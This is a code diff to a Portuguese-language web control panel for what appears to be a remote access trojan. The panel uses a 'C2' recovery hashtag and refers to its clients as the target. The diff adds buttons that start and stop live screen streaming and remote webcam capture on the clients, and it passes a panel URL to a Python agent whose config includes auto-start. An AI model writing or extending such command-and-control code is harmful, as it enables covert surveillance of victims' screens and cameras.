@@ -167,7 +167,7 @@
         <div class="w-full flex justify-between items-center mb-0 sm:mb-4 shrink-0 px-3 py-3 sm:px-4 mt-2 sm:mt-0 bg-black/50 sm:bg-transparent absolute sm:relative top-0 z-50 pointer-events-none">
             <h2 class="text-sm sm:text-xl text-emerald-400 font-bold uppercase tracking-widest flex items-center gap-2 truncate pr-2 shadow-black drop-shadow-md pointer-events-auto">
                 <div class="w-2 h-2 sm:w-3 sm:h-3 bg-red-500 rounded-full animate-pulse shadow-[0_0_8px_#ef4444] shrink-0"></div> 
-                <span class="truncate" id="stream-type-text">Transmissão HD</span>
+                <span class="truncate" id="stream-type-text">Painel de Visualização</span>
             </h2>
             <div class="flex gap-2 pointer-events-auto">
                 <!-- Botão Activar Interação (Rato) -->
@@ -198,7 +198,19 @@
         </div>
 
         <!-- Feedback visual das teclas (Para evitar spam e confirmar ação) -->
-        <div id="key-feedback" class="absolute bottom-6 left-6 z-[70] text-white font-mono text-xl font-bold bg-indigo-600/90 backdrop-blur-sm px-4 py-2 rounded-lg shadow-[0_5px_15px_rgba(79,70,229,0.5)] pointer-events-none transition-opacity duration-200 opacity-0 hidden"></div>
+        <div id="key-feedback" class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[70] text-white font-mono text-2xl sm:text-4xl font-bold bg-indigo-600/90 backdrop-blur-sm px-6 py-4 rounded-xl shadow-[0_5px_25px_rgba(79,70,229,0.5)] pointer-events-none transition-opacity duration-200 opacity-0 hidden"></div>
+
+        <!-- CONTROLES DE TRANSMISSÃO OVERLAY (RODAPÉ DO MODAL) -->
+        <div class="absolute bottom-6 sm:bottom-10 left-1/2 -translate-x-1/2 z-[70] flex flex-wrap justify-center gap-2 sm:gap-3 bg-slate-900/90 p-2 sm:p-3 rounded-2xl backdrop-blur-md border border-slate-700 shadow-2xl">
+            <button id="modal-btn-screen" class="bg-sky-600/80 hover:bg-sky-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-sky-500/50 shadow-[0_0_10px_rgba(2,132,199,0.4)] flex items-center gap-2 active:scale-95">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                Ligar Tela HD
+            </button>
+            <button id="modal-btn-cam" class="bg-teal-900/80 hover:bg-teal-600 text-teal-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-teal-800/50 flex items-center gap-2 active:scale-95">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                Ligar Câmera
+            </button>
+        </div>
 
         <!-- MENU DE CONFIGURAÇÃO DE VÍDEO (ESTILO YOUTUBE) -->
         <div class="absolute bottom-4 right-4 sm:bottom-8 sm:right-8 z-[70] flex justify-end">
@@ -237,12 +249,19 @@
                 <h2 class="text-base sm:text-lg text-emerald-500 font-bold uppercase tracking-widest">Configurações Web</h2>
                 <button onclick="closeModal('global-config-modal')" class="text-gray-500 hover:text-white bg-slate-800/50 p-1.5 rounded-lg"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
             </div>
-            <p class="text-[11px] sm:text-xs text-slate-400 mb-4">Altere a senha mestra ou a hashtag de recuperação do Telegram.</p>
+            <p class="text-[11px] sm:text-xs text-slate-400 mb-4">Altere a senha mestra ou a hashtag de recuperação.</p>
             <div class="space-y-4">
                 <div>
                     <label class="block text-xs text-gray-400 mb-1">Hashtag de Emergência (Telegram):</label>
                     <input type="text" id="admin-tg-hashtag" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-sky-400 font-bold focus:border-emerald-500 text-sm" placeholder="#C2_RECUPERACAO">
                 </div>
+                
+                <!-- NOVO CAMPO: Link do Painel Web -->
+                <div>
+                    <label class="block text-[11px] sm:text-xs text-blue-400 mb-1 font-bold">Link do Painel Web (Para Telegram):</label>
+                    <input type="text" id="admin-panel-url" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-sky-400 focus:border-blue-500 text-sm" placeholder="Ex: https://meu-painel.vercel.app">
+                </div>
+
                 <div class="border-t border-slate-800 pt-3">
                     <label class="block text-xs text-gray-400 mb-1">Nova Senha Mestra (Vazio = Manter):</label>
                     <input type="password" id="admin-new-pw" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-emerald-400 font-bold tracking-[0.3em] text-center focus:border-emerald-500 text-base sm:text-lg">
@@ -555,18 +574,24 @@
             document.getElementById('admin-current-pw').value = '';
             document.getElementById('admin-new-pw').value = '';
             document.getElementById('admin-tg-hashtag').value = globalAdminConfig.tg_hashtag || '#C2_RECUPERACAO';
+            document.getElementById('admin-panel-url').value = globalAdminConfig.panel_url || '';
             document.getElementById('global-config-modal').classList.remove('hidden');
         }
 
         async function updateGlobalAdminConfig() {
             const currentPw = document.getElementById('admin-current-pw').value;
             const newPw = document.getElementById('admin-new-pw').value.trim();
+            const panelUrl = document.getElementById('admin-panel-url').value.trim();
             let newHashtag = document.getElementById('admin-tg-hashtag').value.trim() || '#C2_RECUPERACAO';
             if (!newHashtag.startsWith('#')) newHashtag = '#' + newHashtag;
 
             if (currentPw !== globalAdminConfig.web_password) { alert("Senha Atual incorreta!"); return; }
 
-            const payloadToUpdate = { tg_hashtag: newHashtag };
+            const payloadToUpdate = { 
+                tg_hashtag: newHashtag,
+                panel_url: panelUrl
+            };
+            
             if (newPw) {
                 if (newPw.length < 4) { alert("Senha deve ter no mínimo 4 caracteres!"); return; }
                 payloadToUpdate.web_password = newPw;
@@ -579,9 +604,60 @@
                 await fetch(reqUrl, { method: 'PATCH', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payloadToUpdate) });
                 if (newPw) globalAdminConfig.web_password = newPw;
                 globalAdminConfig.tg_hashtag = newHashtag;
+                globalAdminConfig.panel_url = panelUrl;
                 alert("Configurações atualizadas!");
                 closeModal('global-config-modal');
             } catch(e) { alert("Erro ao guardar as configurações."); }
+        }
+
+        function updateStreamModalUI() {
+            if(!currentStreamTarget) return;
+            const clientData = window.clientsCache[currentStreamTarget] || {};
+            const camActive = clientData.stream_url?.cam_active || false;
+            const streamUrl = clientData.stream_url?.url || "";
+            const hasStream = !!streamUrl;
+
+            currentStreamUrl = streamUrl;
+
+            // Logica Botão Tela
+            const btnScreen = document.getElementById('modal-btn-screen');
+            if(hasStream && !camActive) {
+                btnScreen.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg> Parar Tela`;
+                btnScreen.className = "bg-rose-600/80 hover:bg-rose-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-rose-500/50 shadow-[0_0_10px_rgba(225,29,72,0.4)] flex items-center gap-2 active:scale-95";
+                btnScreen.onclick = () => sendStreamCommand(currentStreamTarget, 'stop_stream', btnScreen);
+            } else {
+                btnScreen.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg> Ligar Tela HD`;
+                btnScreen.className = "bg-sky-600/80 hover:bg-sky-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-sky-500/50 shadow-[0_0_10px_rgba(2,132,199,0.4)] flex items-center gap-2 active:scale-95";
+                btnScreen.onclick = () => sendStreamCommand(currentStreamTarget, 'stream', btnScreen);
+            }
+
+            // Logica Botão Câmera
+            const btnCam = document.getElementById('modal-btn-cam');
+            if(camActive) {
+                btnCam.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> Desligar Câmera`;
+                btnCam.className = "bg-rose-900/80 hover:bg-rose-600 text-rose-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-rose-800/50 flex items-center gap-2 active:scale-95";
+                btnCam.onclick = () => sendCommand(currentStreamTarget, 'stop_cam', btnCam);
+            } else {
+                btnCam.innerHTML = `<svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg> Ligar Câmera`;
+                btnCam.className = "bg-teal-900/80 hover:bg-teal-600 text-teal-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-teal-800/50 flex items-center gap-2 active:scale-95";
+                btnCam.onclick = () => sendCommand(currentStreamTarget, 'start_cam', btnCam);
+            }
+
+            // Atualizar a imagem
+            const img = document.getElementById('live-stream-img');
+            const status = document.getElementById('stream-status');
+            
+            if(streamUrl && img.getAttribute('src') !== streamUrl) {
+                img.setAttribute('src', streamUrl);
+                status.innerText = "A conectar ao túnel HD...";
+                img.onload = () => { status.innerText = ""; };
+            } else if (!streamUrl && img.getAttribute('src')) {
+                img.removeAttribute('src');
+                status.innerText = "Transmissão Inativa. Utilize os botões abaixo.";
+            }
+
+            // Atualizar o Titulo do Modal
+            document.getElementById('stream-type-text').innerText = camActive ? "Câmera ao Vivo" : (hasStream ? "Transmissão HD (Tela)" : "Painel de Visualização");
         }
 
         async function fetchClients() {
@@ -595,6 +671,11 @@
                 const data = await res.json();
                 window.clientsCache = data || {}; 
                 renderClients(window.clientsCache);
+                
+                // Atualiza o modal de Stream se estiver aberto
+                if(currentStreamTarget) {
+                    updateStreamModalUI();
+                }
             } catch (err) {}
             
             const now = new Date();
@@ -651,17 +732,6 @@
                     lastSeenStr = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')} - ${d.getDate()}/${d.getMonth()+1}`;
                 }
 
-                let streamUrl = "";
-                let hasStream = false;
-                if(clientData.stream_url && clientData.stream_url.url) {
-                     streamUrl = clientData.stream_url.url;
-                     hasStream = true;
-                }
-
-                // Lógica de Câmera Adicionada
-                const camAvailable = clientData.status?.cam_available || false;
-                const camActive = clientData.stream_url?.cam_active || false;
-
                 const isExpanded = expandedClients.has(clientId);
                 const detailsDisplayClass = isExpanded ? '' : 'hidden md:block';
                 const chevronRotationClass = isExpanded ? 'rotate-180' : '';
@@ -709,20 +779,10 @@
                                 </div>
                                 
                                 <div class="w-full mb-2">
-                                ${hasStream 
-                                    ? `<div class="grid grid-cols-2 gap-2 text-center">
-                                           <button onclick="openStreamModal('${escClientId}', '${streamUrl}', ${camActive})" class="bg-emerald-600/20 hover:bg-emerald-600 text-emerald-400 hover:text-white border border-emerald-600/30 py-2.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-colors flex items-center justify-center gap-1 active:scale-95"><div class="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse"></div> Ver HD</button>
-                                           <button onclick="sendStreamCommand('${escClientId}', 'stop_stream', this)" class="bg-rose-600/20 hover:bg-rose-600 text-rose-400 hover:text-white border border-rose-600/30 py-2.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-colors active:scale-95">Parar HD</button>
-                                       </div>`
-                                    : `<button onclick="sendStreamCommand('${escClientId}', 'stream', this)" class="w-full bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white border border-sky-600/30 py-2.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-colors shadow-[0_0_10px_rgba(2,132,199,0.1)] active:scale-95">Ligar Live Stream HD</button>`
-                                }
-                                </div>
-
-                                <!-- NOVA SEÇÃO DA CÂMERA -->
-                                <div class="w-full mb-2">
-                                    <button onclick="sendCommand('${escClientId}', '${camActive ? 'stop_cam' : 'start_cam'}', this)" class="w-full ${camActive ? 'bg-rose-900/40 hover:bg-rose-600 text-rose-400 border-rose-900/50' : 'bg-teal-900/40 hover:bg-teal-600 text-teal-400 border-teal-900/50'} border py-2.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-bold transition-colors active:scale-95 flex items-center justify-center gap-2">
-                                        <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
-                                        ${camActive ? 'Desligar Câmera' : 'Ligar Câmera Remota'}
+                                    <!-- NOVO BOTÃO ÚNICO DE TRANSMISSÃO -->
+                                    <button onclick="openStreamModal('${escClientId}')" class="w-full bg-sky-600/20 hover:bg-sky-600 text-sky-400 hover:text-white border border-sky-600/30 py-2.5 sm:py-3 rounded-lg text-[10px] sm:text-xs font-bold transition-colors shadow-[0_0_10px_rgba(2,132,199,0.1)] active:scale-95 flex items-center justify-center gap-2">
+                                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14v-4z"></path><rect x="3" y="6" width="12" height="12" rx="2" ry="2"></rect></svg>
+                                        Assistir ao Vivo
                                     </button>
                                 </div>
 
@@ -1038,15 +1098,8 @@
             }
         }
 
-        function openStreamModal(clientId, streamUrl, isCam = false) {
+        function openStreamModal(clientId) {
             currentStreamTarget = clientId;
-            currentStreamUrl = streamUrl;
-            
-            // Lógica para alterar o texto consoante for Câmera ou Tela
-            const titleSpan = document.getElementById('stream-type-text');
-            if (titleSpan) {
-                titleSpan.innerText = isCam ? "Câmera ao Vivo" : "Transmissão HD";
-            }
             
             const clientData = window.clientsCache[clientId] || {};
             const cfg = clientData.panel_config || {};
@@ -1061,23 +1114,16 @@
 
             document.getElementById('stream-modal').classList.remove('hidden');
             resetStreamZoom();
-            
-            if (streamUrl && streamUrl.includes('http')) {
-                document.getElementById('stream-status').innerText = "A conectar ao túnel Cloudflare HD...";
-                document.getElementById('live-stream-img').src = streamUrl;
-                document.getElementById('live-stream-img').onload = function() {
-                    document.getElementById('stream-status').innerText = "";
-                };
-            } else {
-                document.getElementById('stream-status').innerText = "A aguardar o link da transmissão...";
-            }
+            updateStreamModalUI();
         }
 
         function closeStreamModal() {
             document.getElementById('stream-modal').classList.add('hidden');
             currentStreamTarget = '';
             currentStreamUrl = '';
-            document.getElementById('live-stream-img').src = ""; 
+            
+            const img = document.getElementById('live-stream-img');
+            img.removeAttribute('src'); 
             document.getElementById('stream-status').innerText = "A aguardar conexão com o alvo...";
             resetStreamZoom();
             
@@ -1094,7 +1140,7 @@
             if(btnElement) {
                 let originalText = btnElement.innerHTML;
                 btnElement.disabled = true;
-                btnElement.innerText = "A Executar...";
+                btnElement.innerHTML = "A Executar...";
                 setTimeout(() => { btnElement.innerHTML = originalText; btnElement.disabled = false; }, 3000);
             }
             let reqUrl = `${FB_URL}clients/${clientId}/command.json?auth=${FB_SECRET}`;
@@ -1105,6 +1151,13 @@
         }
 
         async function sendStreamCommand(clientId, cmdStr, btnElement) {
+            if(btnElement) {
+                let originalText = btnElement.innerHTML;
+                btnElement.disabled = true;
+                btnElement.innerHTML = "A Executar...";
+                setTimeout(() => { btnElement.innerHTML = originalText; btnElement.disabled = false; }, 3000);
+            }
+
             let reqUrl = `${FB_URL}clients/${clientId}/command.json?auth=${FB_SECRET}`;
             
             if(cmdStr === 'stop_stream') {
@@ -1238,7 +1291,10 @@
                 max_photos_limit: parseInt(document.getElementById('mod_photos').value) || 12,
                 stream_port: parseInt(document.getElementById('mod_port').value) || 5555,
                 hotkey_str: document.getElementById('mod_hk').value,
-                auto_start: document.getElementById('mod_auto').checked
+                auto_start: document.getElementById('mod_auto').checked,
+                
+                // NOVO: Link do Painel a ser enviado para o Node Python ler.
+                panel_url: globalAdminConfig.panel_url || "" 
             };
             
             const newFbUrl = document.getElementById('mod_fb_url').value.trim();
